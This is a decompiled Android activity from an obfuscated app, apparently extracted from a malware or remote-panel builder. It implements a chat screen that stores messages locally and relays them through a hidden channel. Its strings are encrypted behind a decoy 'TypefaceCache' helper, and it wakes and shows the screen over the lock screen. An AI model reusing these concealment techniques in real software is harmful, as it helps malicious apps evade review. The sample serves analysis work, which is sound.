package app.mobilex.plus;

import android.R;
import android.app.Activity;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.Editable;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import app.mobilex.plus.ChatActivity;
import app.mobilex.plus.util.TypefaceCache;
import org.json.JSONArray;
import org.json.JSONObject;
import v.s.BS2kx9eAoOyDiNGAFlFk;
import v.s.hzCVl0f866ksvpzUUql;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ChatActivity extends Activity {
    public static final String Ee8d2j4S9Vm5yGuR;
    public static volatile ChatActivity ibVTtJUNfrGYbW;
    public static final String xDyLpEZyrcKVe0;
    public final Handler JXn4Qf7zpnLjP5 = new Handler(Looper.getMainLooper());
    public LinearLayout dDIMxZXP1V8HdM;
    public EditText vekpFI4d1Nc4fakF;
    public ScrollView w9sT1Swbhx3hs;

    static {
        TypefaceCache.obtain("0000007E005A009300D100BC00C600AE0035007F004F009E");
        Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("0020007E005A009300CF00B700DB00B4003700790049009E");
        xDyLpEZyrcKVe0 = TypefaceCache.obtain("002E00730048009400F100B800D700B4");
    }

    public final void dDIMxZXP1V8HdM(String str, boolean z) {
        JSONArray jSONArray;
        float f = getResources().getDisplayMetrics().density;
        LinearLayout linearLayout = this.dDIMxZXP1V8HdM;
        if (linearLayout == null) {
            return;
        }
        TextView textView = new TextView(this);
        textView.setText(str);
        textView.setTextSize(14.0f);
        textView.setTextColor(z ? -1 : Color.parseColor(TypefaceCache.obtain("00600025000800D400A300EC0081")));
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(z ? Color.parseColor(TypefaceCache.obtain("00600026000C00D200D500EA0086")) : -1);
        int i = (int) ((27 - 15) * f);
        gradientDrawable.setCornerRadius(i);
        textView.setBackground(gradientDrawable);
        int i2 = (int) (8 * f);
        textView.setPadding(i, i2, i, i2);
        textView.setMaxWidth((int) (((double) textView.getResources().getDisplayMetrics().widthPixels) * 0.75d));
        FrameLayout frameLayout = new FrameLayout(this);
        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(-2, -2);
        layoutParams.gravity = z ? 8388613 : 8388611;
        frameLayout.addView(textView, layoutParams);
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams2.bottomMargin = (int) (4 * f);
        linearLayout.addView(frameLayout, layoutParams2);
        String str2 = xDyLpEZyrcKVe0;
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(Ee8d2j4S9Vm5yGuR, 0);
            try {
                jSONArray = new JSONArray(sharedPreferences.getString(str2, "[]"));
            } catch (Exception unused) {
                jSONArray = new JSONArray();
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037007300430093"), str);
            jSONObject.put(TypefaceCache.obtain("002A00650064009200E300BA00C0"), z);
            jSONObject.put("ts", System.currentTimeMillis());
            jSONArray.put(jSONObject);
            while (jSONArray.length() > 200) {
                jSONArray.remove(0);
            }
            sharedPreferences.edit().putString(str2, jSONArray.toString()).apply();
        } catch (Exception unused2) {
        }
        this.JXn4Qf7zpnLjP5.post(new hzCVl0f866ksvpzUUql(2, this));
    }

    @Override // android.app.Activity
    public final void finish() {
        ibVTtJUNfrGYbW = null;
        super.finish();
        overridePendingTransition(R.anim.fade_in, R.anim.fade_out);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        JSONArray jSONArray;
        super.onCreate(bundle);
        ibVTtJUNfrGYbW = this;
        try {
            getWindow().addFlags(4718592);
        } catch (Exception unused) {
        }
        float f = getResources().getDisplayMetrics().density;
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600050000B00A100A200990087")));
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(0);
        linearLayout2.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600026000C00D200D500EA0086")));
        int i = (int) (16 * f);
        int i2 = (int) (12 * f);
        linearLayout2.setPadding(i, i2, i, i2);
        linearLayout2.setGravity(16);
        TextView textView = new TextView(this);
        textView.setText("👤");
        textView.setTextSize(24.0f);
        int i3 = (int) ((130 - 90) * f);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i3, i3);
        layoutParams.rightMargin = i2;
        linearLayout2.addView(textView, layoutParams);
        LinearLayout linearLayout3 = new LinearLayout(this);
        linearLayout3.setOrientation(1);
        TextView textView2 = new TextView(this);
        textView2.setText(TypefaceCache.checked("04610423047E04DA04A804980487048604790426047400C704AF04E1048604F304760456040D04DD04A0"));
        textView2.setTextSize(16.0f);
        textView2.setTextColor(-1);
        textView2.setTypeface(null, 1);
        linearLayout3.addView(textView2);
        TextView textView3 = new TextView(this);
        textView3.setText(TypefaceCache.checked("047D042B040004D704A904E2"));
        textView3.setTextSize(12.0f);
        textView3.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002E000900A200A0009E00F3")));
        linearLayout3.addView(textView3);
        linearLayout2.addView(linearLayout3, new LinearLayout.LayoutParams(0, -2, 1.0f));
        Button button = new Button(this);
        button.setText("✕");
        button.setTextSize(18.0f);
        button.setTextColor(-1);
        button.setBackgroundColor(0);
        final int i4 = 0;
        button.setOnClickListener(new View.OnClickListener(this) { // from class: v.s.XgaZocI4BBCxbfuk3yL
            public final /* synthetic */ ChatActivity w9sT1Swbhx3hs;

            {
                this.w9sT1Swbhx3hs = this;
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                Editable text;
                String string;
                String string2;
                switch (i4) {
                    case 0:
                        ChatActivity chatActivity = this.w9sT1Swbhx3hs;
                        String str = ChatActivity.Ee8d2j4S9Vm5yGuR;
                        chatActivity.finish();
                        break;
                    default:
                        ChatActivity chatActivity2 = this.w9sT1Swbhx3hs;
                        EditText editText = chatActivity2.vekpFI4d1Nc4fakF;
                        if (editText != null && (text = editText.getText()) != null && (string = text.toString()) != null && (string2 = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(string).toString()) != null) {
                            while (Runtime.getRuntime().maxMemory() < 0) {
                            }
                            if (string2.length() != 0) {
                                EditText editText2 = chatActivity2.vekpFI4d1Nc4fakF;
                                if (editText2 != null) {
                                    editText2.setText("");
                                }
                                chatActivity2.dDIMxZXP1V8HdM(string2, true);
                                try {
                                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                                    if (rWY6BVSB0XxPbw != null) {
                                        JSONObject jSONObject = new JSONObject();
                                        jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0020007E005A009300CF00AD00D700B7002F006F"));
                                        jSONObject.put(TypefaceCache.obtain("002E00730048009400F100B800D7"), string2);
                                        jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), System.currentTimeMillis());
                                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                                    }
                                } catch (Exception e) {
                                    TypefaceCache.obtain("001000730055008300B000BA00C000B5002C0064000100C7");
                                    e.getMessage();
                                }
                                break;
                            }
                        }
                        break;
                }
            }
        });
        linearLayout2.addView(button, new LinearLayout.LayoutParams(i3, i3));
        linearLayout.addView(linearLayout2, new LinearLayout.LayoutParams(-1, -2));
        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        this.w9sT1Swbhx3hs = scrollView;
        LinearLayout linearLayout4 = new LinearLayout(this);
        linearLayout4.setOrientation(1);
        int i5 = (int) (8 * f);
        linearLayout4.setPadding(i5, i5, i5, i5);
        this.dDIMxZXP1V8HdM = linearLayout4;
        this.w9sT1Swbhx3hs.addView(linearLayout4, new ViewGroup.LayoutParams(-1, -2));
        linearLayout.addView(this.w9sT1Swbhx3hs, new LinearLayout.LayoutParams(-1, 0, 1.0f));
        LinearLayout linearLayout5 = new LinearLayout(this);
        linearLayout5.setOrientation(0);
        linearLayout5.setBackgroundColor(-1);
        int i6 = (int) (6 * f);
        linearLayout5.setPadding(i5, i6, i5, i6);
        linearLayout5.setGravity(16);
        EditText editText = new EditText(this);
        editText.setHint(TypefaceCache.checked("04620428040504D604D904EA048F04FF04760038001500C9"));
        editText.setHintTextColor(Color.parseColor(TypefaceCache.obtain("0060002F000200DE00A900E6008B")));
        editText.setTextColor(Color.parseColor(TypefaceCache.obtain("00600025000800D400A300EC0081")));
        editText.setTextSize(15.0f);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(Color.parseColor(TypefaceCache.obtain("00600050000B00A100A200990087")));
        gradientDrawable.setCornerRadius((int) (20 * f));
        editText.setBackground(gradientDrawable);
        int i7 = (int) (10 * f);
        editText.setPadding(i, i7, i, i7);
        editText.setMaxLines(4);
        this.vekpFI4d1Nc4fakF = editText;
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(0, -2, 1.0f);
        layoutParams2.rightMargin = i5;
        linearLayout5.addView(editText, layoutParams2);
        Button button2 = new Button(this);
        button2.setText("➤");
        button2.setTextSize(18.0f);
        button2.setTextColor(-1);
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setShape(1);
        gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600026000C00D200D500EA0086")));
        button2.setBackground(gradientDrawable2);
        final int i8 = 1;
        button2.setOnClickListener(new View.OnClickListener(this) { // from class: v.s.XgaZocI4BBCxbfuk3yL
            public final /* synthetic */ ChatActivity w9sT1Swbhx3hs;

            {
                this.w9sT1Swbhx3hs = this;
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                Editable text;
                String string;
                String string2;
                switch (i8) {
                    case 0:
                        ChatActivity chatActivity = this.w9sT1Swbhx3hs;
                        String str = ChatActivity.Ee8d2j4S9Vm5yGuR;
                        chatActivity.finish();
                        break;
                    default:
                        ChatActivity chatActivity2 = this.w9sT1Swbhx3hs;
                        EditText editText2 = chatActivity2.vekpFI4d1Nc4fakF;
                        if (editText2 != null && (text = editText2.getText()) != null && (string = text.toString()) != null && (string2 = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(string).toString()) != null) {
                            while (Runtime.getRuntime().maxMemory() < 0) {
                            }
                            if (string2.length() != 0) {
                                EditText editText3 = chatActivity2.vekpFI4d1Nc4fakF;
                                if (editText3 != null) {
                                    editText3.setText("");
                                }
                                chatActivity2.dDIMxZXP1V8HdM(string2, true);
                                try {
                                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                                    if (rWY6BVSB0XxPbw != null) {
                                        JSONObject jSONObject = new JSONObject();
                                        jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0020007E005A009300CF00AD00D700B7002F006F"));
                                        jSONObject.put(TypefaceCache.obtain("002E00730048009400F100B800D7"), string2);
                                        jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), System.currentTimeMillis());
                                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                                    }
                                } catch (Exception e) {
                                    TypefaceCache.obtain("001000730055008300B000BA00C000B5002C0064000100C7");
                                    e.getMessage();
                                }
                                break;
                            }
                        }
                        break;
                }
            }
        });
        int i9 = (int) (44 * f);
        linearLayout5.addView(button2, new LinearLayout.LayoutParams(i9, i9));
        linearLayout.addView(linearLayout5, new LinearLayout.LayoutParams(-1, -2));
        setContentView(linearLayout);
        try {
            try {
                jSONArray = new JSONArray(getSharedPreferences(Ee8d2j4S9Vm5yGuR, 0).getString(xDyLpEZyrcKVe0, "[]"));
            } catch (Exception unused2) {
                jSONArray = new JSONArray();
            }
            int length = jSONArray.length();
            for (int i10 = 0; i10 < length; i10++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i10);
                dDIMxZXP1V8HdM(jSONObject.getString(TypefaceCache.obtain("0037007300430093")), jSONObject.getBoolean(TypefaceCache.obtain("002A00650064009200E300BA00C0")));
            }
        } catch (Exception unused3) {
        }
        String stringExtra = getIntent().getStringExtra(TypefaceCache.obtain("002E00730048009400F100B800D7"));
        if (stringExtra != null && !BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(stringExtra)) {
            dDIMxZXP1V8HdM(stringExtra, false);
        }
        overridePendingTransition(R.anim.fade_in, R.anim.fade_out);
        TypefaceCache.obtain("0000007E005A009300D100BC00C600AE0035007F004F009E00B000B000C200A2002D0073005F");
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        ibVTtJUNfrGYbW = null;
        super.onDestroy();
    }
}
